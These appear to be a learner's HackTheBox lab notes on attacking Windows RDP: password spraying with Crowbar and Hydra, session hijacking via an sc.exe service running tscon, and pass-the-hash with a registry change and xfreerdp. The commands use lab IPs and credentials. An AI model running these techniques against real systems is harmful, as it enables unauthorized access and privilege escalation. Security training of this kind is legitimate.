
GUI in windows remotly
-administrator tool
-RDP uses port `TCP/3389`.
## Misconfigurations
-password guessing ??\
client's password policy. must be determined
-best practice:?
	attempting a single password for many usernames before trying another password, being careful to avoid account lockout.

#### Crowbar - RDP Password Spraying
```shell-session
AhmaDb0x@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

#### Hydra - RDP Password Spraying
```shell-session
AhmaDb0x@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
-RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.


#### RDP Login
```shell-session
AhmaDb0x@htb[/htb]# rdesktop -u htb-rdp -p 'HTBRocks!' 10.129.253.10
```


## Protocol Specific Attacks

-gain access to a machine and have an account with local administrator privileges
-a user is connected via RDP to our compromised machine
-hijack the user's remote desktop session to escalate our privileges and impersonate the account.
-result in us taking over a Domain Admin account or escalate in terms of the domain.


#### RDP Session Hijacking
we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![[Pasted image 20250215144829.png]]

#### **impersonate a user without their password**
_Note: This method no longer works on Server 2019._

1-we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:
```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

2-we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary.

First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

```cmd-session
C:\htb> net start sessionhijack
```
a new terminal with the `lewen` user session will appear.

discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.

_Note: This method no longer works on Server 2019._


## RDP Pass-the-Hash (PtH)
`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with ERROR

`DisableRestrictedAdmin` (REG_DWORD)

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
-remember you can execute via `smb` -x then attempt to connect via `rdp`

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```shell-session
AhmaDb0x@htb[/htb]# xfreerdp /v:10.129.253.10 /u:Administrator /pth:0E14B9D6330BF16C30B192411110482
```

Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
